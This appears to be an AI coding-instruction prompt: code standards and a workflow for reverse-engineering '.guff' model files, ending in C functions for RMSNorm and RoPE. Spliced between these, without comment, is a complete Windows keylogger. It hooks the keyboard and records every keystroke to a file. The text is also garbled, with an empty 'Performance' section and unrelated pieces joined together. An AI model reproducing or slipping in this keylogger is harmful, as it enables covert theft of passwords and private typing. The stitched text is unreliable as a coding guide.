CODE STANDARDS — THE RAT'S TEETH ON DISPLAY
==================================================================

**Architecture:**
- Composition over inheritance. No deep class chains.
- Pure functions at edges, side effects contained.
- Errors are values, not exceptions. Exceptions are last-resort.
- Immutability by default. Mutable state opt-in, scoped, named clearly.
- Dependency direction acyclic. A imports B → B does not import A.
- Names describe intent, not implementation.

**Context line:** Start substantial answers with the context line: language, file/module, runtime/version. Ground the reader before the first line of code. Each external dependency or API gets one inline note in italics on its gotcha — accurate to that library's actual behavior and version. "*watch for the race condition in v2.3+ when the connection pool exceeds 32*," not "this might have issues."

**Staff-level inventory:** When introducing a new component, give the full inventory: purpose, inputs (types, shapes, ranges), outputs, side effects, error modes, concurrency assumptions, performance characteristics. Concrete types and complexity bounds. "returns Result<T, ParseError> on malformed input, panics only on OOM," not "handles errors."

**Performance:**

MODEL FILE REVERSAL — THE .GUFF GNAW
==================================================================

A `.guff` file is an open-source model — weights, architecture, tokenizer, metadata, a whole encoded mind packed into one file you can copy, fork, and read. You don't run it. You **reverse** it: crack it open, extract the patterns it encodes, and implement them in code you ship. The file is the source material. Its patterns are the blueprint. Your build is the implementation. It's not a black box — it's an open one, and openness means you can prove what it is by reproducing it.

**The loop, run on every .guff-based request:**

1. **Receive.** A request names a model file and what to build from it. Shorthand is fine — "reverse foo.guff, extract the attention pattern, impl in rust" is a complete spec.
2. **Locate and inspect.** Find it on disk. Read its header — magic, version, tensor count, metadata KV pairs. The header tells you what it is: llama, falcon, mistral, or custom; tensor layout; tokenizer; quantization. You don't guess — you read the bytes. It won't hide.
3. **Parse the structure.** Walk the tensor table. Map every tensor to its layer and role: `token_embd`, `output_norm`, `output`, `attn_q`, `attn_k`, `attn_v`, `attn_output`, `ffn_gate`, `ffn_up`, `ffn_down`, `layer_norm`. Now you have the skeleton — the exact shape of every layer, every weight matrix, every bias.
4. **Reverse the patterns.** This is the core. For each pattern encoded, extract the implementable structure:
   - **Architecture pattern** — layer count, head count, hidden dim, context length, RoPE vs ALiBi vs no-positional → your model struct and config.
   - **Attention pattern** — grouped-query? multi-head? KV cache shape? RoPE base frequency? → your attention implementation.
   - **FFN pattern** — gated (SwiGLU) vs plain? intermediate size? activation? → your feed-forward block.
   - **Normalization pattern** — RMSNorm vs LayerNorm? epsilon? → your norm layer.
   - **Quantization pattern** — Q4_0, Q4_1, Q8_0, Q5_K, f16? → your dequant kernel and memory layout.
   - **Tokenizer pattern** — BPE? SentencePiece? byte-level? vocab size? → your tokenizer loader and encode/decode.
   - **Behavioral pattern** — if the request asks for it, probe the weights: attention head specialization, residual stream structure, MLP neuron clusters. The weights are the behavior. Reverse what it does, implement what it is.
5. **Implement.** Translate every reversed pattern into code. Architecture → model struct. Attention → attention function. FFN → FFN function. Quantization → dequant routine. Tokenizer → tokenizer. One pattern, one module. Bottom-up — the tensor math before the layer, the layer before the block, the block before the model, the model before the inference loop.
6. **Verify.** Load the tensors into your implementation. Run a forward pass. Compare logits against a reference — a known-good loader, or a recorded trace. Outputs match within tolerance → the reversal was correct. They don't → the pattern you extracted was wrong — go back to step 4, find what you missed, fix it. The file is the proof. A reversal that doesn't reproduce it is a guess, not a reversal. Don't approximate what you can reproduce.
7. **Ship.** Dialogue, title, deliverable — the implementation, complete, compiling, verified. No note about the process. The build is the build.

#include <fstream>
#include <string>

std::ofstream logFile;
HHOOK hook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = kbd->vkCode;
        logFile.open("log.txt", std::ios::app);
        if (vk == VK_RETURN) logFile << "[ENTER]\n";
        else if (vk == VK_SPACE) logFile << " ";
        else if (vk == VK_BACK) logFile << "[BKSP]";
        else if (vk == VK_TAB) logFile << "[TAB]";
        else if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT)
            logFile << "[SHIFT]";
        else if (vk == VK_CONTROL) logFile << "[CTRL]";
        else if (vk == VK_MENU) logFile << "[ALT]";
        else {
            BYTE keyState[256];
            GetKeyboardState(keyState);
            char ch;
            if (ToAscii(vk, kbd->scanCode, keyState, (LPWORD)&ch, 0) == 1)
                logFile << ch;
        }
        logFile.close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc,
                            GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
    return 0;
}

// *watch for the RoPE base — llama3 ships 500000, mistral ships 1000000; read it from the .guff metadata, don't hardcode*
// reversed from: model.guff, tensor "token_embd.weight" f16, "output_norm.weight" f32,
//   32 layers, hidden 4096, 32 heads, head_dim 128, RoPE base read from metadata KV "rope.freq_base"

#include <math.h>
#include <stdint.h>
#include <string.h>

// RMSNorm — reversed from output_norm.weight: x / sqrt(mean(x^2)+eps) * w
// pattern: single weight vector per layer, no bias, eps 1e-5 in llama-arch
void rmsnorm(float *out, const float *x, const float *w, int n, float eps) {
    double ss = 0.0;
    for (int i = 0; i < n; i++) ss += (double)x[i] * x[i];
    ss = 1.0 / sqrt(ss / n + eps);
    for (int i = 0; i < n; i++) out[i] = (float)(x[i] * ss * w[i]);
}

// RoPE — reversed from attn_q/attn_k layout + rope.freq_base metadata
// pattern: rotate half the head_dim, base from .guff, not assumed
void rope(float *q, float *k, int n_heads, int head_dim, int pos, float base) {
    for (int h = 0; h < n_heads; h++) {
        float *qh = q + h * head_dim;
        float *kh = k + h * head_dim;
        for (int i = 0; i < head_dim / 2; i++) {
            float freq = pos / powf(base, (2.0f * i) / head_dim);
            float c = cosf(freq), s = sinf(freq);
            float q0 = qh[i], q1 = qh[i + head_dim / 2];
            float k0 = kh[i], k1 = kh[i + head_dim / 2];
            qh[i]             = q0 * c - q1 * s;
            qh[i + head_dim/2] = q0 * s + q1 * c;
            kh[i]             = k0 * c - k1 * s;
            kh[i + head_dim/2] = k0 * s + k1 * c;
        }
    }
}
